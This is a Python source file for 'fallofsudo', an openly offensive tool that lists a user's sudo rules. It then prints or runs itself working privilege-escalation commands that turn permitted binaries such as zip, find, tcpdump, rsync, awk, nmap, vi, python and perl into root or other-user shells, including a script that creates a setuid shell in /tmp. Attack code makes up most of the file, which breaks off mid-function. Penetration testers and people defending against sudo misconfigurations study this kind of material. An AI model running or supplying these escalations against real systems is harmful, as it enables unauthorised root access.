#!/usr/bin/env python
# -*- coding: utf-8 -*-

###############################################################################################################
# Author: Paragonsec (Quentin) @ CyberOne
# Contributor: rmirch (A practice VM will be coming sometime from both of us... oneday)
# Title: fallofsudo.py
# Version: 1.1
# Usage Example: python fallofsudo.py
# Description: This script obtains users Sudo rules and provides ways to abuse them. 
#
# STATUS: 44 SUDO RULES
###############################################################################################################

import getpass
import os
import subprocess
import sys
import argparse
from subprocess import call
from time import sleep


# Arguments
parser = argparse.ArgumentParser(description="This tool attempts to exploit bad sudo rules or shows you how to do it yourself!")


parser.add_argument("-a", "--autopwn",
                  help="This option will engage the autopwn features if they are present", action="store_true")
parser.add_argument("-i", "--info",
                  help="This option will show you how to pwn the sudo rule instead of doing it automatically", action="store_true")

# Check to ensure at least one argument has been passed
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)

args = parser.parse_args()

# Global Variables
global info
global autopwn

#Colors
OKRED = '\033[91m'
OKGREEN = '\033[92m'
OKBLUE = '\033[94m'
OKYELLOW = '\033[93m'
ENDC = '\033[0m'


# Banner
banner = ("""
  █████▒▄▄▄       ██▓     ██▓        ▒█████    █████▒     ██████  █    ██ ▓█████▄  ▒█████  
▓██   ▒▒████▄    ▓██▒    ▓██▒       ▒██▒  ██▒▓██   ▒    ▒██    ▒  ██  ▓██▒▒██▀ ██▌▒██▒  ██▒
▒████ ░▒██  ▀█▄  ▒██░    ▒██░       ▒██░  ██▒▒████ ░    ░ ▓██▄   ▓██  ▒██░░██   █▌▒██░  ██▒
░▓█▒  ░░██▄▄▄▄██ ▒██░    ▒██░       ▒██   ██░░▓█▒  ░      ▒   ██▒▓▓█  ░██░░▓█▄   ▌▒██   ██░
░▒█░    ▓█   ▓██▒░██████▒░██████▒   ░ ████▓▒░░▒█░       ▒██████▒▒▒▒█████▓ ░▒████▓ ░ ████▓▒░
 ▒ ░    ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░   ░ ▒░▒░▒░  ▒ ░       ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ 
 ░       ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░     ░ ▒ ▒░  ░         ░ ░▒  ░ ░░░▒░ ░ ░  ░ ▒  ▒   ░ ▒ ▒░ 
 ░ ░     ░   ▒     ░ ░     ░ ░      ░ ░ ░ ▒   ░ ░       ░  ░  ░   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ▒  
             ░  ░    ░  ░    ░  ░       ░ ░                   ░     ░        ░        ░ ░  
                                                                           ░   
""")

# Obtaining Username
username = getpass.getuser()

# Setting output directory
directory = "Output"
if not os.path.exists(directory):
    os.makedirs(directory)
	

def main():
    print OKRED + banner + ENDC
    print OKGREEN + "Author: " + ENDC + "paragonsec @ CyberOne (https://www.criticalstart.com)"
    print OKGREEN + "Contributors: " + ENDC + "rmirch, roman-mueller, caryhooper"
    print OKGREEN + "Version: " + ENDC + "1.1"
    print OKGREEN + "Description: " + ENDC + "This program aids pentesters in conducting privilege escalation on Linux by abusing sudo. Use for good or training purposes ONLY!\n"
    sudopwner()
	

# Function for the y/n questions
def ask_user(answer):
    yes = set(['yes','y',''])
    no = set(['no','n'])

    while True:
        choice = raw_input(answer).lower()
        if choice in yes:
            return True
        elif choice in no:
            return False
        else:
            print "Please respond with 'yes' or 'no'\n"


# Main section for sudo pwnage
def sudopwner():
	
    print OKBLUE + "[+] Obtaining sudo rules for user " + username + ENDC + "\n"

    # Obtaining SUDO rules
    sudofile()
	
    # Print contents of sudo rules
    sudorules = sudoparse()

    # Identifying sudo rules and choosing a potential pwnage for that rule
    print OKBLUE + "\n[+] Identifying potential pwnage... \n" + ENDC
    choices = []
    for item in sudorules:
        if item[3] == "ALL":
            all_user = item[0]
            choices.append('all')
        elif 'zip' in item[3]:
            zip_user = item[0]
            choices.append('zip')
        elif 'find' in item[3]:
            find_user = item[0]
            choices.append('find')
        elif 'tcpdump' in item[3]:
            tcpdump_user = item[0]
            choices.append('tcpdump')
        elif 'rsync' in item[3]:
            rsync_user = item[0]
            choices.append('rsync')
        elif 'python' in item[3]:
            python_user = item[0]
            choices.append('python')
        elif 'vi' in item[3]:
            vi_user = item[0]
            choices.append('vi')
        elif 'nmap' in item[3]:
            nmap_user = item[0]
            choices.append('nmap')
        elif 'awk' in item[3]:
            awk_user = item[0]
            choices.append('awk')
        elif 'vim' in item[3]:
            vim_user = item[0]
            choices.append('vim')
        elif 'perl' in item[3]:
            perl_user = item[0]
            choices.append('perl')
        elif 'ruby' in item[3]:
            ruby_user = item[0]
            choices.append('ruby')
        elif 'bash' in item[3]:
            bash_user = item[0]
            choices.append('bash')
        elif 'nc' in item[3]:
            nc_user = item[0]
            choices.append('nc')
        elif 'less' in item[3]:
            less_user = item[0]
            choices.append('less')
        elif 'more' in item[3]:
            more_user = item[0]
            choices.append('more')
        elif 'man' in item[3]:
            man_user = item[0]
            choices.append('man')
        elif 'gdb' in item[3]:
            gdb_user = item[0]
            choices.append('gdb')
        elif 'ftp' in item[3]:
            ftp_user = item[0]
            choices.append('ftp')
        elif 'smbclient' in item[3]:
            smbclient_user = item[0]
            choices.append('smbclient')
        elif 'sed' in item[3]:
            sed_user = item[0]
            choices.append('sed')
        elif 'mysql' in item[3]:
            mysql_user = item[0]
            choices.append('mysql')
        elif 'tar' in item[3]:
            tar_user = item[0]
            choices.append('tar')
        elif 'wget' in item[3]:
            choices.append('wget')
        elif 'curl' in item[3]:
            choices.append('curl')
        elif 'mv' in item[3]:
            choices.append('mv')
        elif 'tee' in item[3]:
            choices.append('tee')
        elif 'scp' in item[3]:
            choices.append('scp')
        elif 'ssh' in item[3]:
            ssh_user = item[0]
            choices.append('ssh')
        elif 'cp' in item[3]:
            choices.append('cp')
        elif 'dd' in item[3]:
            choices.append('dd')
        elif 'crontab' in item[3]:
            choices.append('crontab')
        elif 'chown' in item[3]:
            choices.append('chown')
        elif 'chmod' in item[3]:
            choices.append('chmod')
        elif 'cat' in item[3]:
            cat_user = item[0]
            choices.append('cat')
        elif 'mount' in item[3]:
            choices.append('mount')
        elif 'facter' in item[3]:
            facter_user = item[0]
            choices.append('facter')
        elif 'apt-get' in item[3]:
            choices.append('apt-get')
        elif '/sh' in item[3]:
            sh_user = item[0]
            choices.append('sh')
        elif 'ksh' in item[3]:
            ksh_user = item[0]
            choices.append('ksh')
        elif 'zsh' in item[3]:
            zsh_user = item[0]
            choices.append('zsh')
        elif 'nano' in item[3]:
            nano_user = item[0]
            choices.append('nano')
        elif 'journalctl' in item[3]:
            journalctl_user = item[0]
            choices.append('journalctl')
        elif 'dmesg' in item[3]:
            dmesg_user = item[0]
            choices.append('dmesg')
	elif 'nice' in item[3]:
	    nice_user = item[0]
	    choices.append('nice')


    # Options for the user to choose which sudo rule they wish to abuse
    for item in choices:
        if (item == "all") or (item == "sh") or (item == "bash") or (item == "ksh") or (item == "zsh"):
            print OKRED + "[!] Vulnerable sudo rule [EASY TO PWN]: " + ENDC + item
        else:
            print OKRED + "[!] Vulnerable sudo rule: " + ENDC + item
    
    question = raw_input("\n" + OKBLUE + "[?] Enter name of sudo rule you wish to pwn: " + ENDC)

    if question == "all":
        all(all_user)
    elif question == "zip":
        zip(zip_user)
    elif question == "find":
        find(find_user)
    elif question == "tcpdump":
        tcpdump(tcpdump_user)
    elif question == "rsync":
        rsync(rsync_user)
    elif question == "python":
        python(python_user)
    elif question == "vi":
        vi(vi_user)
    elif question == "nmap":
        nmap(nmap_user)
    elif question == "awk":
        awk(awk_user)
    elif question == "vim":
        vim(vim_user)
    elif question == "perl":
        perl(perl_user)
    elif question == "ruby":
        ruby(ruby_user)
    elif question == "bash":
        bash(bash_user)
    elif question == "nc":
        nc(nc_user)
    elif question == "less":
        less(less_user)
    elif question == "more":
        more(more_user)
    elif question == "man":
        man(man_user)
    elif question == "gdb":
        gdb(gdb_user)
    elif question == "ftp":
        ftp(ftp_user)
    elif question == "smbclient":
        smbclient(smbclient_user)
    elif question == "sed":
        sed(sed_user)
    elif question == "mysql":
        mysql(mysql_user)
    elif question == "tar":
        tar(tar_user)
    elif question == "wget":
        wget()
    elif question == "curl":
        curl()
    elif question == "mv":
        mv()
    elif question == "tee":
        tee()
    elif question == "scp":
        scp()
    elif question == "ssh":
        ssh(ssh_user)
    elif question == "cp":
        cp()
    elif question == "dd":
        dd()
    elif question == "crontab":
        crontab()
    elif question == "chown":
        chown()
    elif question == "chmod":
        chmod()
    elif question == "cat":
        cat(cat_user)
    elif question == "mount":
        mount()
    elif question == "facter":
        facter(facter_user)
    elif question == "apt-get":
        aptget()
    elif question == "sh":
        sh(sh_user)
    elif question == "ksh":
        ksh(ksh_user)
    elif question == "zsh":
        zsh(zsh_user)
    elif question == "nano":
        nano(nano_user)
    elif question == "journalctl":
        journalctl(journalctl_user)
    elif question == "dmesg":
        dmesg(dmesg_user)
    elif question == "nice":
        nice(nice_user)
    else:
        print OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC
        sys.exit()

# Saving sudo rules to a csv file for easy parsing
def sudofile():

    # File to save sudo rules output
    fname = "Output/sudorules.txt"
    f = open(fname, "w+")

    # run the sudo -ll command
    # Update suggested by jesmith
    try:
	sudoll = subprocess.check_output(['sudo' , '-ll'])
    except subprocess.CalledProcessError as e:
        print e.output
	sys.exit(1)

    sudoll = subprocess.check_output(['sudo' , '-ll'])

    # Saving sudoll output to file
    f.write(sudoll)
    f.close
    

# Used to parse the contents of the sudo output
def sudoparse():
     
    sudooutput = []
    commands_block = 0

    # Loop through the SUDO rules gathed earlier
    with open('Output/sudorules.txt', 'r') as sudoers:
        for line in sudoers:
            line = line.strip()
            if not line.startswith('Sudoers'):
                continue
            runas_user = runas_group = options = cmd = None
            for line in sudoers:
                line = line.strip()
                k = line.split(':')[-1].strip()
                if line.lower().startswith('runasusers'):
                    runas_user = k
                elif line.lower().startswith('runasgroups'):
                    runas_group = k
                elif line.lower().startswith('options'):
                    options = k
                elif line.lower().startswith('commands') :
                    commands_block = 1
                elif commands_block == 1:
                    cmd = line.strip()
                    if cmd and not cmd.startswith('Sudoers entry'):
                        sudooutput.append([runas_user, runas_group, options, cmd])

    # Printing out SUDO rules for the user
    print OKGREEN + "[!] " + username + " has the following sudo rules:" + ENDC
    for item in sudooutput:
        print OKGREEN + "\n[!] RunAsUsers: " + ENDC + item[0]
        if item[1] != None:
	    print OKGREEN + "[!] RunAsGroups: " + ENDC + item[1]
        if item[2] != None:
            print OKGREEN + "[!] Options: " + ENDC + item[2]
        print OKGREEN + "[!] Commands: " + ENDC + item[3]

    return sudooutput

# SUDO zip Rule Pwnage
def zip(zip_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First we need to create a empty file to pass to the zip command: " + ENDC
        print OKRED + " [*] touch /tmp/foo" + ENDC
        print OKBLUE + "[2] Finally we will execute the sudo rule using the unzip-command argument: " + ENDC
        if (zip_user == "ALL") or (zip_user == "root"):
            print OKRED + " [*] sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC
        else:
            print OKRED + " [*] sudo -u " + zip_user + " zip /tmp/foo.zip /tmp/foo -T --unzip-command='sh -c /bin/bash'" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + '\n[?] Do you wish to abuse the zip rule? ' + ENDC)

        if question == True:

            # First step of pwnage for zip
            print OKGREEN + "\n[!] First Step: " + ENDC + "Creating /tmp/foo"
            call('touch /tmp/foo', shell=True)
    
            sleep(0.5)

            # Exploit the sudo rule zip
            print OKGREEN + "[!] Pwning ZIP rule now!!!" + ENDC
            if (zip_user == "ALL") or (zip_user == "root"):
                print OKGREEN + "\n[!] Getting shell as root!" + ENDC
                call('sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command="sh -c /bin/bash"', shell=True)
            else:
                print OKGREEN + "\n[!] Getting shell as " + zip_user + "!" + ENDC
                call('sudo -u ' + zip_user + ' zip /tmp/foo.zip /tmp/foo -T --unzip-command="sh -c /bin/bash"', shell=True)
        
        elif question == False:
            sudopwner()


# SUDO ALL Rule Pwnage
def all(all_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type one of the two commands: " + ENDC
        print OKRED + "[*] sudo -i" + ENDC
        if (all_user == "ALL") or (all_user == "root"):
            print OKRED + "[*] sudo su" + ENDC
        else:
            print OKRED + "[*] sudo su " + all_user + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:
    
        question = ask_user( OKRED + '\n[?] Do you wish to abuse the ALL/ALL rule? ' + ENDC)

        if question == True:

            # Exploit the sudo rule ALL/ALL
            print OKGREEN + "\n[!] Pwning the ALL/ALL rule now!!!" + ENDC
        
            print OKGREEN + "\n[!] Executing 'sudo su' to gain shell!" + ENDC
            if all_user == "ALL":
                print OKGREEN + "\n[!] Gaining shell as root!" + ENDC
                call('sudo su', shell=True)
            else:
                print OKGREEN + "\n[!] Gaining shell as " + all_user + "!" + ENDC
                call('sudo su ' + all_user, shell=True)
    
        elif question == False:
            sudopwner()


# SUDO find Rule Pwnage
def find(find_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (find_user == "ALL") or (find_user == "root"):
            print OKRED + "[*] sudo find . -exec bash -i \;" + ENDC
        else:
            print OKRED + "[*] sudo -u " + find_user + " find . -exec bash -i \;" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + '\n[?] Do you wish to abuse the find rule? ' + ENDC)

        if question == True:

            # Exploit the sudo rule find
            print OKGREEN + "\n[!] Pwning the find rule now!!!" + ENDC
            print OKGREEN + "\n[!] Executing 'sudo find . -exec bash -i \;' to gain shell!!!" + ENDC
            if (find_user == "ALL") or (find_user == "root"):
                print OKGREEN + "\n[!] Getting shell as root!" + ENDC
                call('sudo find . -exec bash -i \;', shell=True)
            else:
                print OKGREEN + "\n[!] Getting shell as " + find_user + "!" + ENDC
                call('sudo -u ' + find_user + ' find . -exec bash -i \;', shell=True)


        elif question == False:
            sudopwner()


# SUDO tcpdump Rule Pwnage
def tcpdump(tcpdump_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious file in a partition that allows setuid: " + ENDC
        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
        print OKBLUE + "[2] Next we need to change that maliciouos file to be executable: " + ENDC
        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
        print OKBLUE + "[3] Next we will abuse the packet rotate feature of TCPDUMP in order to execute our malicious script: " + ENDC
        if (tcpdump_user == "ALL") or (tcpdump_user == "root"):
            print OKRED + " [*] sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root" + ENDC
        else:
            print OKRED + " [*] sudo -u " + tcpdump_user + " tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z " + tcpdump_user + ENDC
        print OKBLUE + "[4] Finally execute your /tmp/pwnage file that was created!" + ENDC
        print OKRED + " [*] ./pwnage" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + '\n[?] Do you wish to abuse the tcpdump rule? ' + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the tcpdump rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicous file!" + ENDC
            call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh",shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Running TCPDUMP packet rotate to execute our malicious script (read the source to see the payload)!" + ENDC
            if (tcpdump_user == "ALL") or (tcpdump_user == "root"):
                print OKGREEN + "\n[!] Creating setuid shell as root!" + ENDC
                call("sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root", shell=True)
            else:
                print OKGREEN + "\n[!] Creating setuid shell as " + tcpdump_user + "!" + ENDC
                call("sudo -u " + tcpdump_user + " tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z " + tcpdump_user, shell=True)

            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        elif question == False:
            sudopwner()


# SUDO rsync Rule Pwnage
def rsync(rsync_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious file in a partition that allows setuid: " + ENDC
        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
        print OKBLUE + "[2] Next we need to change that maliciouos file to be executable: " + ENDC
        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
        print OKBLUE + "[3] Next we need to create a empty file to pass to the rsync command: " + ENDC
        print OKRED + " [*] touch /tmp/aaa" + ENDC
        print OKBLUE + "[4] Next we will execute the rsync command in order to run our evil.sh script: " + ENDC
        if (rsync_user == "ALL") or (rsync_user == "root"):
            print OKRED + " [*] sudo rsync -e /tmp/evil.sh <username> @127.0.0.1:/tmp/aaa bbb" + ENDC
        else:
            print OKRED + " [*] sudo -u " + rsync_user + " rsync -e /tmp/evil.sh <username> @127.0.0.1:/tmp/aaa bbb" + ENDC
        print OKBLUE + "[5] Finally execute your /tmp/pwnage file that was created!" + ENDC
        print OKRED + " [*] ./pwnage" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the rsync rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the tcpdump rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious file!" + ENDC
            call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Creating /tmp/aaa file!" + ENDC
            call("touch /tmp/aaa",shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Running rsync command!" + ENDC
            
            if (rsync_user == "ALL") or (rsync_user == "root"):
                print OKGREEN + "\n[!] Creating setuid shell as root!" + ENDC
                call("sudo rsync -e /tmp/evil.sh " + username + "@127.0.0.1:/tmp/aaa bbb", shell=True)
            else:
                print OKGREEN + "\n[!] Creating setuid shell as " + rsync_user + "!" + ENDC
                call("sudo -u " + rsync_user + " rsync -e /tmp/evil.sh " + username + "@127.0.0.1:/tmp/aaa bbb", shell=True)

            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        if question == False:
            sudopwner()

# SUDO awk Rule Pwnage
def awk(awk_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (awk_user == "ALL") or (awk_user == "root"):
            print OKRED + "[*] sudo awk 'BEGIN {system('/bin/bash')}'" + ENDC
        else:
            print OKRED + "[*] sudo -u " + awk_user + " awk 'BEGIN {system('/bin/bash')}'" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the awk rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the awk rule now!!!" + ENDC
            if (awk_user == "ALL") or (awk_user == "root"):
                print OKGREEN + "\n[!] Getting shell as root!" + ENDC
                call("sudo awk 'BEGIN {system('/bin/bash')}'", shell=True)
            else:
                print OKGREEN + "\n[!] Getting shell as " + awk_user + "!" + ENDC
                call("sudo -u " + awk_user + " awk 'BEGIN {system('/bin/bash')}", shell=True)

        if question == False:
            sudopwner()


# SUDO nmap Rule Pwnage
def nmap(nmap_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious nse script to execute: " + ENDC
        print OKRED + " [*] echo 'os.execute('/bin/sh')' > /tmp/pwnage.nse" + ENDC
        print OKBLUE + "[2] Finally execute that nse script with nmap: " + ENDC
        if (nmap_user == "ALL") or (nmap_user == "root"): 
            print OKRED + " [*] sudo nmap --script=/tmp/pwnage.nse" + ENDC
        else:
            print OKRED + " [*] sudo -u " + nmap_user + " nmap --script=/tmp/pwnage.nse" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:
    
        question = ask_user( OKRED + "\n[?] Do you wish to abuse the nmap rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the nmap rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious file!" + ENDC

            call("echo 'os.execute('/bin/sh')' > /tmp/pwnage.nse", shell=True)

            if (nmap_user == "ALL") or (nmap_user == "root"):
                print OKGREEN + "\n[!] Obtaining root shell!" + ENDC
                call("sudo nmap --script=/tmp/pwnage.nse", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + nmap_user + "!" + ENDC
                call("sudo -u " + nmap_user + " nmap --script=/tmp/pwnage.nse", shell=True)

        if question == False:
            sudopwner()


# SUDO vi Rule Pwnage
def vi(vi_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (vi_user == "ALL") or (vi_user == "root"):
            print OKRED + "[*] sudo vi -c ':shell'" + ENDC
        else:
            print OKRED + "[*] sudo -u " + vi_user + " vi -c ':shell'" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the vi rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the vi rule now!!!" + ENDC

            if (vi_user == "ALL") or (vi_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo vi -c ':shell'", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + vi_user + "!" + ENDC
                call("sudo -u " + vi_user + " vi -c ':shell'", shell=True)

        if question == False:
            sudopwner()


# SUDO vim Rule Pwnage
def vim(vim_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (vim_user == "ALL") or (vim_user == "root"):
            print OKRED + "[*] sudo vim -c ':shell'" + ENDC
        else:
            print OKRED + "[*] sudo -u " + vim_user + " vim -c ':shell'" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] DO you wish to abise the vim rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the vim rule now!!!" + ENDC

            if (vim_user == "ALL") or (vim_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo vim -c ':shell'", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + vim_user + "!" + ENDC
                call("sudo -u " + vim_user + " vim -c ':shell'", shell=True)

        if question == False:
            sudopwner()


# SUDO python Rule Pwnage
def python(python_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious python script: " + ENDC
        print OKRED + " [*] echo 'os.system('/bin/bash)' > /tmp/pwnage.py" + ENDC
        print OKBLUE + "[2] Finally execute that python script to get your shell: " + ENDC
        if (python_user == "ALL") or (python_user == "root"):
            print OKRED + " [*] sudo python /tmp/pwnage.py" + ENDC
        else:
            print OKRED + " [*] sudo -u " + python_user + " python /tmp/pwnage.py" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:
    
        question = ask_user( OKRED + "\n[?] Do you wish to abuse the python rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the python rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating the malcious file now!" + ENDC

            call("echo 'os.system('/bin/bash')' > /tmp/pwnage.py", shell=True)

            print OKGREEN + "\n[!] Obtaining shell!" + ENDC

            if (python_user == "ALL") or (python_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo python /tmp/pwnage.py", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + python_user + "!" + ENDC
                call("sudo -u " + python_user + " python /tmp/pwnage.py", shell=True)

        if question == False:
            sudopwner()


# SUDO perl Rule Pwnage
def perl(perl_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious perl script: " + ENDC
        print OKRED + " [*] echo 'exec '/bin/bash';' > /tmp/pwnage.pl" + ENDC
        print OKBLUE + "[2] Finally execute that perl script to get your shell: " + ENDC
        if (perl_user == "ALL") or (perl_user == "root"):
            print OKRED + " [*] sudo perl /tmp/pwnage.pl" + ENDC
        else:
            print OKRED + " [*] sudo -u " + perl_user + " perl /tmp/pwnage.pl" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:
    
        question = ask_user( OKRED + "\n[?] Do you wish to abuse the perl rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the perl rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating the malicious file now!" + ENDC

            call("echo 'exec '/bin/bash';' > /tmp/pwn.pl", shell=True)

            print OKGREEN + "\n[!] Obtaining shell!" + ENDC

            if (perl_user == "ALL") or (perl_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo perl /tmp/pwn.pl", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + perl_user + "!" + ENDC
                call("sudo -u " + perl_user + " perl /tmp/pwn.pl", shell=True)

        if question == False:
            sudopwner()


# SUDO ruby Rule Pwnage
def ruby(ruby_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious ruby script: " + ENDC
        print OKRED + " [*] echo 'exec '/bin/bash';' > /tmp/pwnage.rb" + ENDC
        print OKBLUE + "[2] Finally execute that ruby script to get your shell: " + ENDC
        if (ruby_user == "ALL") or (ruby_user == "root"):
            print OKRED + " [*] sudo ruby /tmp/pwnage.rb" + ENDC
        else:
            print OKRED + " [*] sudo -u " + ruby_user + " ruby /tmp/pwnage.rb" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:
    
        question = ask_user( OKRED + "\n[?] Do you wish to abuse the ruby rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the ruby rule now!!!" + ENDC
            print OKGREEN + "[!] Creating the malicious file now!" + ENDC

            call("echo 'exec '/bin/bash';' > /tmp/pwn.rb", shell=True)

            print OKGREEN + "[!] Obtaining shell!" + ENDC

            if (ruby_user == "ALL") or (ruby_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo ruby /tmp/pwn.rb", shell=True)
            else:
                print OKGREEN + "\n[!] Obtianing shell as " + ruby_user + "!" + ENDC
